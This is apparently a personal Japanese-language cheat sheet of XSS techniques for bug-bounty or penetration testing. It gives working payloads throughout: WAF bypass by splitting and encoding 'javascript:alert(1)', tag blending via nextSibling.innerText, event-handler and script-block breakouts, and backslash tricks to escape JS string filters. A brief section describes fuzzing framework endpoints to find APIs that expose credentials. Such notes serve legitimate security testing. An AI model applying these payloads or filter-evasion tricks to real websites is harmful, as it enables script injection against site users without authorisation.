### XSS

#### WAFバイパスについて
WAFは「(」と「)」の順序で括弧をキャッチする  
→文字列を複数の部分に分割したり、キーワードを分割したり、文字の順序を変更すればWAFを回避できる  

```
<svg+onload=location='javascript:alert(1)'>

↓これだとひっかかるから改造する

<svg onload=a=')',b='t(1',j='javas',s='cript:aler',location=j+s+b+a>

↓これをエンコードして実行する

%3Csvg%20onload%3Da%3D')'%2Cb%3D't(1'%2Cj%3D'javas'%2Cs%3D'cript%3Aaler'%2Clocation%3Dj%2Bs%2Bb%2Ba%3E

```

#### タグブレンディングによるWAFバイパス
nextSibling.innerTextを使用することで、次のタグの値を指定できる  
→これを利用してWAFバイパスをする

bタグで囲んだところを良いところで区切ってWAFバイパスを行う  

```
<svg onload=location=nextSibling.innerText>
<b>javas<b></b>cript:al<b></b>ert(1)</b>
```

↓inner/outerHTML プロパティベースのペイロードには次のものがある  

```
<svg onload=location=all[22].innerText>
<b>javas<b></b>cript:al<b></b>ert(1)</b>
```

また、ブラウザ開発ツール(F12キー)でconsole.log(document.all)を使用して、nextSibling要素が22個目にあったとした場合↓
```
<svg onload=innerHTML=nextSibling.innerText>
<b><img/src/on<b></b>error=al<b></b>ert(1)></b>
```

#### XSSテク

```
よく使う型
<svg onload=alert(1) />
http://brutelogic.com.br/xss.php?a=<svg onload=alert(1)>

記号のフィルタリングがされている場合はタグから抜け出せないからイベントハンドラーを使う  
以下は入力フィールド上にマウスをポイントすると発火する  
http://brutelogic.com.br/xss.php?b3=” onmouseover=alert(1)//
```

```

HTML injectionでブラウザの解析では HTML タグが優先されるため、ブロックを終了して新しいタグを挿入するだけで済む

<script>
	// HTMLi in Js Block (Single Quotes)
	var c1 = 'value1';

	// HTMLi in Js Block (Double Quotes)
	var c2 = "value2";

	// Simple Js Injection (Single Quotes)
	var c3 = 'value3';

	// Simple Js Injection (Double Quotes)
	var c4 = "value4";

	// Escaped Js Injection (Single Quotes)
	var c5 = 'value5';

	// Escaped Js Injection (Double Quotes)
	var c6 = "value6";

</script>

http://brutelogic.com.br/xss.php?c1=</script><svg onload=alert(1)>
```

```
フィルタリングされていて挿入しても以下のようになる場合
var myVar3 = '><svg onload=alert(1)>';

その場合は、以下のように-で連結することでエスケープできる
'-alert(1)-'
var myVar3 = ''-alert(1)-''

ただしこれに対してもバックスラッシュ(\)でフィルターされる場合は無効となる
以下が無効となる例:
var myVar5 = '\'-alert(1)-\'';

そのため上手くバックスラッシュを挿入して引用符が切れるようにする
http://brutelogic.com.br/xss.php?c5=\'-alert(1)//
↓
var myVar5 = '\\'-alert(1)//';


```


#### JavaScriptのホイスティングを利用したXSS
宣言されていないか存在しないオブジェクトへの参照により、JavaScript パーサーは ReferenceError をスローしてしまい、
うまくXSSがささらない場合は、既存の関数を再度使用(ホイスティング)してバイパスすることができる  
https://brutelogic.com.br/blog/xss-with-hoisting/

### API
各フレームワークにあったエンドポイントリストを使ってファジング→ヒットしたURIにアクセスしてクレデンシャルなデータを保持しているAPIを見つける
Reactであればapp.jsが/に相当するため、setting.jsにアクセスすれな/settingに入れたりする
https://www.bugbountyhunter.com/guides/?type=javascript_files

### HTML反映テスト
シンプルだけど強力
test<h2>test1
